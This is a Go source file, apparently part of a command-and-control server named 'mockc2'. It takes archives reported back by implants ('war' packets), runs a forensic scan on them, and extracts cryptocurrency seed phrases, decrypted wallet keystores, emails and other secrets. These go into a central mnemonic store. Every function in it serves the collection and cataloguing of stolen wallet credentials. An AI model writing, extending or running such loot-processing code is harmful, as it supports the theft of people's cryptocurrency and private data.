package forensics

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"
	"sync"

	"mockc2/internal/config"
	"mockc2/internal/store"
)

// ── 报告汇总 ──

// SummaryFromReport 从 smart_forensics 报告提取汇总字段。
func SummaryFromReport(rep map[string]any) (brands string, mnemonicCnt, validCnt, keystoreDec, secretsCnt int, emails, detailJSON string) {
	if rep == nil {
		return
	}
	if bm, ok := rep["brands"].(map[string]any); ok {
		var parts []string
		for k, v := range bm {
			parts = append(parts, fmt.Sprintf("%s(%v)", k, v))
		}
		brands = strings.Join(parts, ",")
	}
	if arr, ok := rep["emails"].([]any); ok {
		var es []string
		for _, e := range arr {
			if s := strings.TrimSpace(fmt.Sprintf("%v", e)); s != "" {
				es = append(es, s)
			}
		}
		emails = strings.Join(es, ",")
	}
	if arr, ok := rep["secrets"].([]any); ok {
		secretsCnt = len(arr)
		seenM := map[string]bool{}
		for _, sv := range arr {
			m, ok := sv.(map[string]any)
			if !ok {
				continue
			}
			t := strings.ToLower(fmt.Sprintf("%v", m["type"]))
			if strings.Contains(t, "mnemonic") {
				ph := strings.TrimSpace(fmt.Sprintf("%v", m["value"]))
				if ph == "" || seenM[ph] {
					continue
				}
				seenM[ph] = true
				mnemonicCnt++
				if b, ok := m["bip39"].(bool); ok && b {
					validCnt++
				}
			}
		}
	}
	if arr, ok := rep["keystores"].([]any); ok {
		for _, kv := range arr {
			m, ok := kv.(map[string]any)
			if !ok {
				continue
			}
			if strings.EqualFold(fmt.Sprintf("%v", m["status"]), "DECRYPTED") {
				keystoreDec++
			}
		}
	}
	if b, err := json.Marshal(rep); err == nil {
		if len(b) > 1<<20 {
			b = b[:1<<20]
		}
		detailJSON = string(b)
	}
	return
}

// ── 后台自动检测 worker ──

type job struct {
	packetID int64
	path     string
	uuid     string
}

var (
	jobOnce sync.Once
	jobCh   chan job
)

// StartWorker 启动后台检测 worker（单实例，顺序处理，避免打满 CPU）。
func StartWorker() {
	jobOnce.Do(func() {
		jobCh = make(chan job, 8192)
		go func() {
			for j := range jobCh {
				func() {
					defer func() { _ = recover() }()
					runOne(j)
				}()
			}
		}()
	})
}

// Enqueue 把新回传的 war 包加入后台检测队列（非阻塞，队列满则丢弃）。
func Enqueue(packetID int64, path, uuid string) {
	if jobCh == nil || packetID <= 0 || path == "" {
		return
	}
	select {
	case jobCh <- job{packetID, path, uuid}:
	default:
	}
}

func runOne(j job) {
	rep, err := RunSmart(j.path, false)
	if err != nil && rep == nil {
		store.SaveWarScan(j.packetID, j.uuid, false, "", 0, 0, 0, 0, "", "", err.Error())
		return
	}
	brands, mc, vc, kd, sc, emails, detail := SummaryFromReport(rep)
	store.SaveWarScan(j.packetID, j.uuid, true, brands, mc, vc, kd, sc, emails, detail, "")
	// 助记词库：把 war 检测/还原出来的助记词集中存放。
	store.SaveRecoveredWords(j.uuid, "war", j.packetID, extractMnemonics(rep))
}

// extractMnemonics 从 smart_forensics 报告的 secrets 里提取助记词（按词串去重）。
func extractMnemonics(rep map[string]any) []store.RecoveredWord {
	arr, ok := rep["secrets"].([]any)
	if !ok {
		return nil
	}
	seen := map[string]bool{}
	var out []store.RecoveredWord
	for _, sv := range arr {
		m, ok := sv.(map[string]any)
		if !ok {
			continue
		}
		if !strings.Contains(strings.ToLower(fmt.Sprintf("%v", m["type"])), "mnemonic") {
			continue
		}
		ph := strings.TrimSpace(fmt.Sprintf("%v", m["value"]))
		if ph == "" || ph == "<nil>" || seen[ph] {
			continue
		}
		seen[ph] = true
		valid, _ := m["bip39"].(bool)
		wallet := fmt.Sprintf("%v", m["table"])
		if bs, ok := m["brands"].([]any); ok && len(bs) > 0 {
			wallet = fmt.Sprintf("%v", bs[0])
		}
		out = append(out, store.RecoveredWord{
			Phrase: ph, Words: len(strings.Fields(ph)), Valid: valid,
			Wallet: wallet, Crosscheck: fmt.Sprintf("%v", m["crosscheck"]),
		})
	}
	// keystore 解密出的明文可能就是助记词（status=DECRYPTED 的 plaintext）。
	if ks, ok := rep["keystores"].([]any); ok {
		for _, kv := range ks {
			m, ok := kv.(map[string]any)
			if !ok || !strings.EqualFold(fmt.Sprintf("%v", m["status"]), "DECRYPTED") {
				continue
			}
			ph := strings.TrimSpace(fmt.Sprintf("%v", m["plaintext"]))
			if ph == "" || ph == "<nil>" || seen[ph] {
				continue
			}
			seen[ph] = true
			out = append(out, store.RecoveredWord{
				Phrase: ph, Words: len(strings.Fields(ph)), Valid: true,
				Wallet: "", Crosscheck: "keystore 解密",
			})
		}
	}
	return out
}

// ScanPending 把尚未检测的 war 包全部加入后台队列（返回入队数量）。
func ScanPending(limit int) int {
	rows := store.PendingWarPackets(limit)
	root := config.Get().CaptureRoot
	n := 0
	for _, r := range rows {
		fp := store.ToStr(r["file_path"])
		if fp == "" {
			continue
		}
		abs := filepath.Join(root, filepath.FromSlash(fp))
		Enqueue(store.ToInt(r["packet_id"]), abs, store.ToStr(r["uuid"]))
		n++
	}
	return n
}
